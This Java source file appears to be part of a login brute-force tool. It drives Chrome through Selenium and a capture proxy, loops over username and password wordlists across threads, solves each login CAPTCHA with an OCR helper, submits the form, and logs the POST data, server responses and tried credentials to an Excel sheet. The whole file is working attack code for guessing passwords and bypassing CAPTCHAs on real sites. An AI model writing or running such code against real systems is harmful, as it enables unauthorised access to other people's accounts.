package sample;


import net.lightbody.bmp.BrowserMobProxy;
import net.lightbody.bmp.BrowserMobProxyServer;
import net.lightbody.bmp.client.ClientUtil;
import net.lightbody.bmp.core.har.Har;
import net.lightbody.bmp.core.har.HarEntry;
import net.lightbody.bmp.core.har.HarPostDataParam;
import net.lightbody.bmp.proxy.CaptureType;
import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.ExpectedCondition;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.time.Duration;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

public class openchrome implements Runnable {

    private String url;
    private String account;
    private String passwd;
    private String yzmimg;
    private String yanzgengma;
    private String denglukuang;

    private int threadnum;

    private int index;

    private String replace;



    public openchrome(String url, String account, String passwd, String yzmimg, String yanzgengma, String denglukuang, int threadnum, int index, String replace) {
        this.account = account;
        this.passwd = passwd;
        this.url = url;
        this.yanzgengma = yanzgengma;
        this.denglukuang = denglukuang;
        this.yzmimg = yzmimg;

        this.threadnum = threadnum;
        this.index = index;
        this.replace = replace;
    }


    @Override
    public void run() {

        File path = getFilePath.getPath();
        String parent = path.getParent();

        System.setProperty("webdriver.chrome.driver", parent + "/Tools/chromedriver.exe");
//        System.setProperty("webdriver.chrome.driver", "src/Tools/chromedriver.exe");
        BrowserMobProxy browserMobProxy = new BrowserMobProxyServer();

        browserMobProxy.start();

        browserMobProxy.enableHarCaptureTypes(CaptureType.REQUEST_CONTENT, CaptureType.RESPONSE_CONTENT);
        browserMobProxy.setHarCaptureTypes(CaptureType.RESPONSE_CONTENT, CaptureType.REQUEST_CONTENT);


        browserMobProxy.newHar("kk");


        Proxy proxy = ClientUtil.createSeleniumProxy(browserMobProxy);

        String httpProxy = proxy.getHttpProxy();
        String port = httpProxy.substring(httpProxy.indexOf(":"));

        System.out.println(httpProxy);

        proxy.setHttpProxy("127.0.0.1" + port);


        ChromeOptions options = new ChromeOptions().addArguments("--proxy-server=http://" + proxy.getHttpProxy(), "--incognito");

        options.addArguments("--disable-extensions");
        options.addArguments("–disable-plugins");

//        options.addArguments("blink-settings=imagesEnabled=false");


        WebDriver driver = new ChromeDriver(options);


        int usersize = getAccount.user.size();
        int passsize = getAccount.password.size();

        int nums = usersize * passsize;


        int count = nums / threadnum;

        int num = 0;


        int i1 = count * (index) / passsize;
        int i2 = count * (index) % passsize;



        ExecutorService executorService2 = Executors.newSingleThreadExecutor();
        Thread thread2 = new Thread(() -> {

            Har har = browserMobProxy.getHar();
            har.getLog().getEntries().removeIf(x -> !x.getRequest().getMethod().equals("POST"));
            har.getLog().getEntries().removeIf(x -> Pattern.matches(".*google.*", x.getRequest().getUrl()));
            int finalHarsize = har.getLog().getEntries().size();

            if (finalHarsize != 0 && finalHarsize != 1) {
                List<HarEntry> entries = har.getLog().getEntries();

                String a =null;
                List<HarPostDataParam> params = entries.get(finalHarsize - 2).getRequest().getPostData().getParams();
                for (HarPostDataParam param : params) {
                    a = a+param.getValue() + "------";
                }
                a = a+entries.get(finalHarsize - 2).getResponse().getContent().getText();
                System.out.println(a);
            }

        });


        ExecutorService executorService = Executors.newCachedThreadPool();

        try {

            ok:
            for (int j = i1; j < usersize; j++) {

                if (j != i1) i2 = 0;
                for (int k = i2; k < passsize; k++) {
                    driver.get(url);  //地址栏输入百度地址

                    new WebDriverWait(driver, Duration.ofSeconds(6), Duration.ofMillis(120L)).until(
                            (ExpectedCondition<WebElement>) webDriver -> webDriver.findElement(By.cssSelector(yanzgengma)));


                    String canonicalPath = driver.findElement(By.cssSelector(yzmimg)).getScreenshotAs(OutputType.FILE).getCanonicalPath();

                    CountDownLatch countDownLatch = new CountDownLatch(1);

                    final String print = null;

                    Thread thread = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            String print = pyyzm.print(canonicalPath);
                            driver.findElement(By.cssSelector(yanzgengma)).sendKeys(print);
                            countDownLatch.countDown();
                        }
                    });

                    executorService.execute(thread);

                    driver.findElement(By.cssSelector(account)).sendKeys(getAccount.user.get(j));//搜索输入框输入Selenium

                    driver.findElement(By.cssSelector(passwd)).sendKeys(getAccount.password.get(k));//搜索输入框输入Selenium

                    countDownLatch.await();

                    driver.findElement(By.cssSelector(denglukuang)).click();//点击百度一下按钮

                    driver.manage().timeouts().implicitlyWait(400, TimeUnit.SECONDS);
                    Thread.sleep(100);

                    executorService2.execute(thread2);
                    num++;
                        if (num == count) {
                            break ok;
                        }
                }
            }

        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

        driver.close();

        Har har = browserMobProxy.getHar();
        har.getLog().getEntries().removeIf(x -> !x.getRequest().getMethod().equals("POST"));
        har.getLog().getEntries().removeIf(x -> Pattern.matches(".*google.*", x.getRequest().getUrl()));

        synchronized (baopochrome.class) {

            Sheet sheet = createFile.getsheet();
            XSSFWorkbook ex = createFile.getEx();

            int indexnum = index * count;


            try {

                for (int i = 0; i < count; i++) {

                    Row row = sheet.createRow(indexnum + i);
                    int size = har.getLog().getEntries().get(i).getRequest().getPostData().getParams().size();

                    List<HarPostDataParam> params = har.getLog().getEntries().get(i).getRequest().getPostData().getParams();

                    for (int j = 0; j < size; j++) {
                        Cell cell = row.createCell(j);
                        cell.setCellValue(params.get(j).getValue());
                    }
                    Cell cell2 = row.createCell(size + 2);
                    cell2.setCellValue(har.getLog().getEntries().get(i).getResponse().getContent().getText());
                }

                int nnum = 0;
                ok:
                for (int j = i1; j < usersize; j++) {

                    if (j != i1) i2 = 0;
                    for (int k = i2; k < passsize; k++) {

                        Cell cell1 = sheet.getRow(indexnum + nnum).createCell(har.getLog().getEntries().get(nnum).getRequest().getPostData().getParams().size() + 5);
                        cell1.setCellValue(getAccount.user.get(j));

                        Cell cell2 = sheet.getRow(indexnum + nnum).createCell(har.getLog().getEntries().get(nnum).getRequest().getPostData().getParams().size() + 6);
                        cell2.setCellValue(getAccount.password.get(k));

                        nnum++;
                            if (nnum == count) {
                                break ok;
                            }
                    }
                }

                System.out.println(parent + "//output//" + replace + ".xlsx");
//                FileOutputStream outputStream = new FileOutputStream("har/" + replace + ".xlsx");
                FileOutputStream outputStream = new FileOutputStream(parent + "//output//" +replace+ ".xlsx");
                ex.write(outputStream);

            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
}
